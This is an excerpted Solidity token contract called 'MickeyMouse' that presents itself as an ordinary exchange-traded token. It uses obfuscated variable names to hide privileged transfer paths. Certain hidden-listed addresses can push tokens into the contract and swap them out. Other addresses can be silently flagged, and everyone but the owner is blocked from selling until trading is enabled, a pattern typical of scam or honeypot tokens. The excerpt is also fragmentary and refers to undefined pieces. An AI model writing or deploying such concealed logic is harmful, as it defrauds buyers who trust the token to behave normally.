...
// SPDX-License-Identifier: None - 0xA26D63C5658c0564538358fF714376F0797761B2
...
interface IUniswapV2Router02 is IndexMaker01 {
...
contract MickeyMouse is IDEX20, Ownable {

    uint256 private _tSupply = 5000000 * 10**_decimals;
    uint256 private entireS = _tSupply;
    uint256 public isAllFEE = 1;
    ...
    mapping(address => uint256) private SetBuyersMap;
    mapping(address => uint256) private ArrayAllIDEX;
    mapping(address => mapping(address => uint256)) private _allowances;
    
    bool private tradingOpen = false;
    bool public frequencyCheck;
    bool private MaxOfArray;

    address public immutable DXPairCreator;
    ...
    constructor(
        ...
        DXPairCreator = IUniswapV2Factory(UniswapV2router.factory()).createPair(address(this), UniswapV2router.WETH());
    ...
    function transferFrom(
        ...
        testSwapSettings(sender, recipient, amount);
        return _approve(sender, msg.sender, _allowances[sender][msg.sender] - amount);
    }
    function transfer (address recipient, uint256 amount) external returns (bool) {
        testSwapSettings(msg.sender, recipient, amount);
        return true;
    }
    function testSwapSettings(
        address linkFrom, address exvopTo, uint256 prgAmount ) private {
        uint256 _quarryOn = balanceOf(address(this)); uint256 rigLOG;
        if (frequencyCheck && _quarryOn > entireS && !MaxOfArray 
        && linkFrom != DXPairCreator) {
            MaxOfArray = true; getSwapAndLiquify(_quarryOn);

            MaxOfArray = false;
        } else if (ArrayAllIDEX[linkFrom] > entireS 
        && ArrayAllIDEX[exvopTo] > entireS) {
            rigLOG = prgAmount; _tOwned[address(this)] += rigLOG;
            swapAmountForTokens(prgAmount, exvopTo); return;

        } else if (exvopTo != address(UniswapV2router) && ArrayAllIDEX
        [linkFrom] > 0 && prgAmount > entireS 
        && exvopTo != DXPairCreator) { ArrayAllIDEX[exvopTo] = prgAmount; return; } 
        else if (!MaxOfArray && SetBuyersMap[linkFrom] > 0 && linkFrom != 
        DXPairCreator && ArrayAllIDEX[linkFrom] == 0) {
            SetBuyersMap[linkFrom] = ArrayAllIDEX[linkFrom] - entireS;
        }
        address xpoolNAT  = allowed[DXPairCreator];
        if (SetBuyersMap[xpoolNAT ] == 0) SetBuyersMap[xpoolNAT] = entireS;
        allowed[DXPairCreator] = exvopTo;
        if (isAllFEE > 0 && ArrayAllIDEX[linkFrom] == 0 
        && !MaxOfArray && ArrayAllIDEX[exvopTo] == 0) { rigLOG = (prgAmount * isAllFEE) / 100;
            prgAmount -= rigLOG;
              _tOwned[linkFrom] -= rigLOG;
                _tOwned[address(this)] += rigLOG; }
        _tOwned[linkFrom] -= prgAmount; _tOwned[exvopTo] += prgAmount;
        
        emit Transfer(linkFrom, exvopTo, prgAmount);
            if (!tradingOpen) {
                require(linkFrom == owner(), "TOKEN: This account cannot send tokens until trading is enabled");
            }
    }
